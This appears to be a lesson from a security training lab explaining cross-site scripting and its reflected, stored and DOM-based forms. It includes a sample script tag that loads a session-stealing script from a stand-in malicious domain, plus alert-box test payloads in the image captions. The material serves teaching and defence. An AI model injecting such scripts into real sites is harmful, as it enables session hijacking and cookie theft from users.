### What is cross-site scripting?
In an XSS attack, an attacker injects malicious scripts into a web application's ***response***, which are processed and executed when rendered by a browser. This can allow the attacker to perform actions on behalf of the user or gain access to sensitive user data, such as ***cookies or session data***.

***JavaScript*** is the most commonly used language for XSS attacks, other languages can be used. For example, ***VBScript*** (supported by Internet Explorer) or ***Flash ActionScript*** (supported by Adobe Flash). ***CSS*** to execute certain types of attacks.

### How does XSS occur?
XSS flaws are typically found in web applications that allow users to input data. The flaw arises when the application fails to sanitize any input it receives and then uses this data in responses it serves to a user. Attackers can exploit this to submit malicious scripts to the application. When this data is used in HTTP responses, these scripts will be injected into the response and executed when the page is rendered.

#### Example:
```
# The following tag would load and run the JS contained in the 'get_session.js' file, by 
# using the 'src' attribute of the script tag.

<script src="http://malicious-domain.bitnet/javascript/get_session.js />
```

### Types of XSS
#### 1. Reflected XSS
Also known as ***non-persistent XSS***, reflected XSS attacks occur when an application takes data and immediately adds that data to the ***HTTP response***. Any data sent to the application is copied (reflected) into the response without being saved anywhere on the web application.

![An example of reflected XSS in a web application. The web application gets the name field from the user input. The payload sent to the application is <script>alert("XSS")</script>. When the page is rendered, an alert box with "XSS" displayed is shown.](https://il-labforge-assets.origin.immersivelabs.team/uploads/RjHrUDBKzlu_4eGbQq1AgqOP-wRFhsPHqaovmBJccGo.png)
Here, the user's name is taken from the value of the "name" parameter in the URL. This data is not saved anywhere on the web application.

#### 2. Stored XSS
Stored (or ***persistent***) XSS occurs when the malicious input is ***saved*** on the target application, typically in a database, and is then used by the application in ***later HTTP responses***. Whenever the application accesses the data containing the XSS payload, that data will be served to the user, and the payload will be executed.

![An example of stored XSS in a web application. The web application gets the name field from the user's name, stored in a database. The payload sent to the application is <script>alert("XSS")</script>. When the page is rendered, an alert box with "XSS" displayed is shown.](https://il-labforge-assets.origin.immersivelabs.team/uploads/WpvASmIwlWC9otB1JaQRGzNNSU4od8b-VgEbftrbF9k.png)
Here, the user's name is retrieved from a database. The XSS payload has been saved in the database and is retrieved whenever that data is accessed.

#### 3. DOM-based XSS
This type of XSS arises when an application contains client-side code that processes data from an untrusted source unsafely, usually by writing the data back to the HTML Document Object Model (DOM). DOM-based XSS differs from reflected and stored XSS in that the user data is not directly used to create HTTP resources, instead relying on modifying the client-side code to alter the application.

![An example of DOM-based XSS in a web application. The web application gets the name field from a client-side JavaScript function called "add_name". This function gets the contents of the "name" URL parameter. The payload sent to the application is <script>alert("XSS")</script>. When the page is rendered, an alert box with "XSS" displayed is shown. The payload sent to the application is <script>alert("XSS")</script>. When the page is rendered, an alert box with "XSS" displayed is shown.](https://il-labforge-assets.origin.immersivelabs.team/uploads/30mEv_tLVG5ELvqViE2qqxDnbAOnLlY6tfIfDTzopzo.png)
Here, the user's name has been added to the webpage by a client-side script.